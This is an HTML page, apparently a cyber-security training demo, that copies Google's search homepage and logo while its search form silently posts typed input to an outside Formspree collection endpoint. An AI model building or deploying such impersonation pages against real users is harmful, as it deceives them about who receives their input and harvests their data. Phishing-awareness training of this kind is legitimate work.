<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Search</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: white;
        }

        .page {
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 180px;
        }

        /* Google-style logo */
        .logo {
            font-size: 70px;
            font-weight: bold;
            letter-spacing: -5px;
            margin-bottom: 30px;
        }

        .g1 { color: #4285F4; }
        .o1 { color: #EA4335; }
        .o2 { color: #FBBC05; }
        .g2 { color: #4285F4; }
        .l  { color: #34A853; }
        .e  { color: #EA4335; }

        /* Search form */
        form {
            width: 90%;
            max-width: 580px;
        }

        .search-container {
            height: 48px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            display: flex;
            align-items: center;
            padding: 0 15px;
            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.15);
        }

        .search-icon {
            width: 20px;
            height: 20px;
            margin-right: 12px;
        }

        .search-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
        }

        .search-button {
            margin-top: 25px;
            padding: 10px 18px;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            background: #f8f9fa;
            color: #202124;
            font-size: 14px;
            cursor: pointer;
        }

        .search-button:hover {
            border: 1px solid #dadce0;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        .info {
            margin-top: 25px;
            color: #70757a;
            font-size: 13px;
        }
    </style>
</head>

<body>

    <div class="page">

        <!-- Google-style logo -->
        <div class="logo">
            <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
        </div>

        <!-- Formspree form -->
        <form
            action="https://formspree.io/f/mljrbqdp"
            method="POST"
        >

            <div class="search-container">

                <!-- Search icon -->
                <svg class="search-icon"
                     viewBox="0 0 24 24"
                     fill="none"
                     stroke="#5f6368"
                     stroke-width="2">

                    <circle cx="11" cy="11" r="7"></circle>
                    <line x1="16.5" y1="16.5" x2="21" y2="21"></line>

                </svg>

                <input
                    type="text"
                    name="search_text"
                    class="search-input"
                    placeholder="Search..."
                    autocomplete="off"
                    required
                >

            </div>

            <center>
                <button type="submit" class="search-button">
                    Google Search
                </button>
            </center>

        </form>

        <div class="info">
            Cyber Security Training Demo
        </div>

    </div>

</body>
</html>
